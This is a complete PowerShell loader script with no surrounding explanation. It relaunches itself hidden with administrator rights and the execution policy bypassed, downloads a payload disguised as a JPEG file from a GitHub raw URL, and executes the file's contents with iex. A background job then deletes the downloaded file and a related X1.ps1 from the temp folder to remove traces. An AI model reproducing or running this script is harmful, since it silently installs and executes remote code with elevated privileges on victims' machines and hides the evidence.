if(!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')){
    Start-Process -Verb RunAs powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -WindowStyle Hidden;exit
}
$url="https://github.com/node-nl0/-/raw/main/385.jpg"
$path="$env:TEMP\385.jpg"
(New-Object Net.WebClient).DownloadFile($url,$path)
iex(Get-Content $path -Raw)
Start-Job -ScriptBlock {
    Start-Sleep -Seconds 35
    Remove-Item -Force "$env:TEMP\X1.ps1" -ErrorAction SilentlyContinue
    Remove-Item -Force "$env:TEMP\385.jpg" -ErrorAction SilentlyContinue
}
